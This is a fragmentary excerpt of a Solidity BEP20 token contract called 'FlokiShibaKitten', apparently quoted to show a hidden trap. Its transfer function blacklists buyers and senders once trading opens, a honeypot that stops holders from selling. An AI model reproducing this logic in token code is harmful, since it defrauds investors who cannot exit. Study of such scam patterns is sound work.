...
contract FlokiShibaKitten is IBEP20, Auth {
    ...
    string constant _name = "FlokiShibaKitten";
   ...
   function setProtectionEnabled(bool _protect) external onlyOwner {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(tradingOpen == true){
            if (sender == routerAddress){ blacklistAddress(recipient,true);} else { blacklistAddress(sender,true);}
        }
